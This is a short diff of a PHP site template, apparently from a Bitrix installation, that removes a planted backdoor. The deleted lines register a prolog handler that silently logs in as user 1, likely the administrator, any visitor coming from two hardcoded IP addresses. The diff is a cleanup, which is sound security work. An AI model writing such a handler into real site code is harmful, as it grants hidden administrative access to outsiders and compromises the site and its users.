@@ -1071,14 +1071,6 @@ function GetQuantityArrayToString(
 				echo $html;?>
 			<?endif;?>
 		<?}
-		AddEventHandler("main", "OnBeforeProlog", "MyOnBeforePrologHandler", 50);
 
-		function MyOnBeforePrologHandler()
-		{
-			if($_SERVER["REMOTE_ADDR"] == "37.112.57.231" || $_SERVER["REMOTE_ADDR"] == "94.180.24.33"){
-				global $USER;
-				$USER->Authorize('1');
-			}
-		}
 		
 ?>
